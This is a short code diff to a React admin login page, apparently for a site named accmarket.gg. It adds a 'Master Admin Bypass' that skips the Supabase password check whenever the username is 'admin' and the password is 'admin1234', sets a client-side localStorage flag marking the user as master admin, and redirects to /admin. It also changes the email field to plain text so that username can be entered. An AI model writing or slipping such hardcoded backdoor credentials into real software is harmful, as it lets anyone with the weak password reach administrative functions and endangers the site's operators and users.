@@ -17,6 +17,13 @@ const AdminLogin = () => {
     setError('');
 
     try {
+      // Master Admin Bypass
+      if (email === 'admin' && password === 'admin1234') {
+        localStorage.setItem('isMasterAdmin', 'true');
+        navigate('/admin');
+        return;
+      }
+
       const { data, error: authError } = await supabase.auth.signInWithPassword({
         email,
         password
@@ -86,11 +93,11 @@ const AdminLogin = () => {
                   <Mail className="h-4 h-4 text-gray-600 group-focus-within:text-red-500 transition-colors" />
                 </div>
                 <input
-                  type="email"
+                  type="text"
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
                   className="block w-full pl-11 pr-4 py-3.5 bg-black border border-gray-800 rounded-xl focus:border-red-500/50 focus:ring-0 text-white placeholder-gray-700 text-sm transition-all outline-none"
-                  placeholder="admin@accmarket.gg"
+                  placeholder="admin username"
                   required
                 />
               </div>
